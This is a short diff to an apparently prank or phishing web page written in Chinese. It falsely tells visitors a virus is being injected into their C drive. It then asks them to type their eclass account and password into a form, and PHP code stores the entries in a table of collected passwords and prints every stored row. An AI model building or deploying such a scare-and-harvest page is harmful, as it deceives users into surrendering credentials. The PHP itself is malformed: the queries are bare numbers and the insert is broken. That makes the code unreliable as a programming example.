@@ -4,9 +4,9 @@
 <p> 正在注射病毒到C盘........ </p>
 <p> 若您不想被盗取密码，请您输入您的eclass账号和密码密码在此 </p>
 
-<form action="xxxx.php" method="post">
-<input type="text" name="name" value="" >
-<input type="password" name="password" value="">
+<form action="hhhh.php" method="post">
+<input type="text" name="name" value="账号ID" >
+<input type="password" name="password" value="密码Password">
 <input type="submit" value="提交"> 
 </form>
 
@@ -18,10 +18,13 @@ $passwd = $_POST['password'];
 
  <?php
 
-$sql = "insert into 账号密码大全 values(`)";
-$result = mysql_query(2);//已防止“ERIC病毒”入侵
+$sql = "insert into 账号密码大全 values(1)";
+$result = mysql_query(2);//hemetal.github.io
+
 $SQL = "SELECT * from 账号密码大全";
-$result = mysql_query(3);//已防止“ERIC病毒”入侵
+$result = mysql_query(3);//hemetal.github.io
+
+
 while($list = mysql_fetch_row($result)){
 print_r($list);
                         }
